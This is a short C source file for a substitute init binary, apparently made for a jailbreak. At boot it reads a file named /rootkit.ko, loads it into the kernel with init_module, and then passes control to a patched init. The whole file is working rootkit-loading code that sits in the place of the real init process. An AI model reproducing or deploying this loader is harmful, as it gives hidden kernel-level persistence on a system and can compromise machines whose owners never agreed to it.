#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/syscall.h>
/*
Compile:
    gcc -m32 -s -static -o init init.c
*/
extern char** environ;

int main(int argc, char * argv[]){
    printf("\n***** JAILBRAKED INIT *****\n\n");
    int fd = open("/rootkit.ko", O_RDONLY);
    char * params = "";
    size_t image_size;
    struct stat st;
    void *image;
    fstat(fd, &st);
    image_size = st.st_size;
    image = malloc(image_size);
    read(fd, image, image_size);
    close(fd);
    if (init_module(image, image_size, params) != 0) {
        printf("\n!!! Rootkit Failed \n\n");
    }
    free(image);
    return execve("/init.patched", argv, environ);
}